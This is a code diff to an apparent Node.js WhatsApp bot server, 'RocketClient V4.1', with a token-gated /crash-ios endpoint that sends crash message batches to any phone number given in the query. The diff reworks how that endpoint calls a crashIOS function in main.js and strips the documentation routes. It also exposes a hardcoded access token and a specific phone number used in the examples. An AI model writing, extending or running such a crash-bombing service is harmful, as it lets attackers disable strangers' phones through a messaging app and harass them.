@@ -28,21 +28,9 @@ async function connectBot() {
 
   sock.ev.on("messages.upsert", async (chatUpdate) => {
     const m = chatUpdate.messages[0];
-    if (!m.message) return;
-    if (m.key.remoteJid === "status@broadcast") return;
-    if (m.key.id?.startsWith("BAE5")) return;
-
+    if (!m.message || m.key.remoteJid === "status@broadcast" || m.key.id?.startsWith("BAE5")) return;
     require("./main.js")(sock, m, chatUpdate);
   });
-
-  sock.decodeJid = (jid) => {
-    if (!jid) return jid;
-    if (/:\d+@/gi.test(jid)) {
-      const decode = jidDecode(jid) || {};
-      return decode.user && decode.server ? `${decode.user}@${decode.server}` : jid;
-    }
-    return jid;
-  };
 
   sock.ev.on("connection.update", async (update) => {
     const { connection, lastDisconnect } = update;
@@ -56,6 +44,8 @@ async function connectBot() {
     } else if (connection === "open") {
       sessionExists = true;
       console.log("Bot conectado com sucesso!");
+      // === PASSA O sock PARA O main.js UMA VEZ ===
+      require("./main.js").setSocket(sock);
     }
   });
 
@@ -70,12 +60,8 @@ app.get("/", (req, res) => {
     bot: sessionExists ? "conectado" : "desconectado",
     token: "@xd",
     endpoints: {
-      "/status": "GET → { connected: true }",
-      "/connect?token=@xd&query=5582993708218": "Gera código",
-      "/deleteSession?token=@xd": "Deleta sessão",
-      "/crash-ios?token=@xd&query=5582993708218": "Crash iOS (envia . → 10 lotes)"
-    },
-    docs: "/docs"
+      "/crash-ios?token=@xd&query=5582993708218": "Crash iOS DIRETO (10 lotes)"
+    }
   });
 });
 
@@ -103,7 +89,7 @@ app.get("/deleteSession", (req, res) => {
   res.json({ success: "Sessão deletada" });
 });
 
-// === CRASH iOS – Só 1 argumento: targetJid ===
+// === CRASH iOS DIRETO: SÓ PASSA O NÚMERO ===
 app.get("/crash-ios", async (req, res) => {
   if (req.query.token !== "@xd") return res.status(401).json({ error: "Token inválido" });
   if (!sessionExists) return res.status(400).json({ error: "Bot não conectado" });
@@ -114,30 +100,12 @@ app.get("/crash-ios", async (req, res) => {
   const targetJid = num + "@s.whatsapp.net";
 
   try {
-    const { initiateCrash } = require("./main.js");
-    await initiateCrash(sock, targetJid);   // ← Só 1 argumento
-    res.json({ success: true, target: targetJid, message: "Crash iniciado (. → 10 lotes)" });
+    const { crashIOS } = require("./main.js");
+    await crashIOS(targetJid);  // ← SÓ 1 ARGUMENTO: targetJid
+    res.json({ success: true, target: targetJid, message: "Crash iOS enviado (10 lotes)" });
   } catch (err) {
-    res.status(500).json({ error: "Falha ao iniciar", details: err.message });
+    res.status(500).json({ error: "Falha", details: err.message });
   }
-});
-
-app.get("/docs", (req, res) => {
-  res.json({
-    api: "RocketClient V4.1",
-    token: "@xd",
-    endpoints: {
-      "GET /": "Retorna este JSON",
-      "GET /status": "Status do bot",
-      "GET /connect?token=@xd&query=NUMERO": "Gera código",
-      "GET /deleteSession?token=@xd": "Deleta sessão",
-      "GET /crash-ios?token=@xd&query=NUMERO": "Crash iOS"
-    },
-    examples: {
-      connect: "curl '/connect?token=@xd&query=5582993708218'",
-      crash: "curl '/crash-ios?token=@xd&query=5582993708218'"
-    }
-  });
 });
 
 // === SERVIDOR ===
